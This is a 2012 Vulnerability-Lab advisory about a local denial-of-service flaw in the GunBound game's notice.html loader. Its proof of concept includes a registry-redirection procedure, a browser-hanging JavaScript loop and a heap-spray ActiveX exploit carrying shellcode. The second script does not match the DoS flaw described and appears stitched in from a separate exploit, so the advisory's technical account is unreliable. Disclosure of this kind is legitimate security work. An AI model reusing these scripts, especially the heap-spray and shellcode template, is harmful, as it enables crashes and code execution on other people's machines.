Title:
======
GunBound - Denial of Service Vulnerability


Date:
=====
2012-07-16


References:
===========
http://www.vulnerability-lab.com/get_content.php?id=664


VL-ID:
=====
664


Common Vulnerability Scoring System:
====================================
2


Introduction:
=============
GunBound (Korean: is a free-to-play, turn-based, room-to-room, multiplayer online game with many similar 
features to the popular Worms game series. GunBound was developed and is maintained by South Korean developer Softnyx. 
It is currently in its third major release, subtitled Season 2 internationally. It was called GunBound Revolution in 
North America with ijji as its host before it was shut down on July 24, 2009. The first major beta release 
was Thor s Hammer.

(Copy of the Website: http://en.wikipedia.org/wiki/GunBound )


Abstract:
=========
A Vulnerability Laboratory Researcher (X-Cisadane) discovered a local Denial of Service Vulnerability in the official GunBound Game.


Report-Timeline:
================
2012-07-16:	Public or Non-Public Disclosure


Status:
========
Published


Exploitation-Technique:
=======================
Local


Severity:
=========
Medium


Details:
========
A denial of service vulnerability is detected in the official korean GunBound web browser game. 
The vulnerability allows local attackers to inject own strings or html codes as notice.html to 
slow down the application browser game via (example html loop. The denial of service vulnerability 
is located WebHost element of the game software. Successful exploitation results in heavy laggs and
stable persistent software crashs.

Vulnerable Element(s):
			[+] WebHost Address Element - notice.html


Proof of Concept:
=================
The vulnerability can be exploited by local attacker with privileged user or system account.
For demonstration or reproduce ...

[1]   Install the newst version of GunBound from the website.
[2]   Upload 1ST Script or 2ND Script into your WebHost and named with notice.html. 
      Note: IF you don't have WebHost, you can use Local Web Server Software such : XAMPP, WAMP, Vertrigoserv, etc.
[3]   Edit GunBound Registry : HKLM\SOFTWARE\SoftNyx\GunBound. 
      Find Url_Notice then right click and select Modify, fill with : http://[SERVER|HOST]/notice.html OR http://127.0.0.1/notice.html
[4]   Save the setting and startup the game to play a round! 
[5]   VOILA your machine/system crashs or laggs very heavy.


1.1
<body onload="javascript:kali_cisadane();"></body>
<script>
function kali_cisadane() {
var X = '\x42';
for (i =0;i<666;i++) {
X+=X+'\x42';
document.write(+X+X);
}
}
</script>


1.2
<html xmlns="http://www.w3.org/1999/xhtml">
<body>
<object id=target classid="CLSID:{88d969c5-f192-11d4-a65f-0040963251e5}" >
</object>
<script>
var obj = null;
function exploit() {
obj = document.getElementById('target').object;
try {
obj.open(new Array(),new Array(),new Array(),new Array(),new Array());
} catch(e) {};

sh = unescape ("%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090" +
"%u9090%u9090%uE8FC%u0044%u0000%u458B%u8B3C%u057C%u0178%u8BEF%u184F%u5F8B%u0120" +
"%u49EB%u348B%u018B%u31EE%u99C0%u84AC%u74C0%uC107%u0DCA%uC201%uF4EB%u543B%u0424" +
"%uE575%u5F8B%u0124%u66EB%u0C8B%u8B4B%u1C5F%uEB01%u1C8B%u018B%u89EB%u245C%uC304" +
"%uC031%u8B64%u3040%uC085%u0C78%u408B%u8B0C%u1C70%u8BAD%u0868%u09EB%u808B%u00B0" +
"%u0000%u688B%u5F3C%uF631%u5660%uF889%uC083%u507B%uF068%u048A%u685F%uFE98%u0E8A" +
"%uFF57%u63E7%u6C61%u0063");

sz = sh.length * 2;
npsz = 0x400000-(sz+0x38);
nps = unescape ("%u0D0D%u0D0D");
while (nps.length*2<npsz) nps+=nps;
ihbc = (0x12000000-0x400000)/0x400000;
mm = new Array();
for (i=0;i<ihbc;i++) mm[i] = nps+sh;
obj.open(new Object(),new Object(),new Object(),new Object(), new Object());    
obj.setRequestHeader(new Object(),'......');
obj.setRequestHeader(new Object(),0x12345678);
obj.setRequestHeader(new Object(),0x12345678);
obj.setRequestHeader(new Object(),0x12345678);
obj.setRequestHeader(new Object(),0x12345678);
obj.setRequestHeader(new Object(),0x12345678);
obj.setRequestHeader(new Object(),0x12345678);
obj.setRequestHeader(new Object(),0x12345678);
obj.setRequestHeader(new Object(),0x12345678);
obj.setRequestHeader(new Object(),0x12345678);
obj.setRequestHeader(new Object(),0x12345678);
obj.setRequestHeader(new Object(),0x12345678);
}
</script>
<body onLoad='exploit()' value='Exploit'>
</body></html>


Solution:
=========
The vulnerability can be patched by parsing the input of the WebHost element in the GunBound software.
The notice.html file execution (example|listing) should can be fixed by parsing the executable listing in the software itself.


Risk:
=====
The security risk of the local denial of service vulnerability is estimated as low(+)|medium(-).


Credits:
========
X-Cisadane


Disclaimer:
===========
The information provided in this advisory is provided as it is without any warranty. Vulnerability-Lab disclaims all warranties, 
either expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-
Lab or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business 
profits or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some 
states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation 
may not apply. We do not approve or encourage anybody to break any vendor licenses, policies, deface websites, hack into databases 
or trade with fraud/stolen material.

Domains:    www.vulnerability-lab.com   	- www.vuln-lab.com			       - www.vulnerability-lab.com/register
Contact:    admin@vulnerability-lab.com 	- support@vulnerability-lab.com 	       - research@vulnerability-lab.com
Section:    video.vulnerability-lab.com 	- forum.vulnerability-lab.com 		       - news.vulnerability-lab.com
Social:	    twitter.com/#!/vuln_lab 		- facebook.com/VulnerabilityLab 	       - youtube.com/user/vulnerability0lab
Feeds:	    vulnerability-lab.com/rss/rss.php	- vulnerability-lab.com/rss/rss_upcoming.php   - vulnerability-lab.com/rss/rss_news.php

Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory. 
Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other 
media, are reserved by Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, sourcecode, videos and 
other information on this website is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed), 
modify, use or edit our material contact (admin@vulnerability-lab.com or support@vulnerability-lab.com) to get a permission.

    				   	Copyright © 2012 | Vulnerability Laboratory



-- 
VULNERABILITY RESEARCH LABORATORY
LABORATORY RESEARCH TEAM
CONTACT: research@vulnerability-lab.com

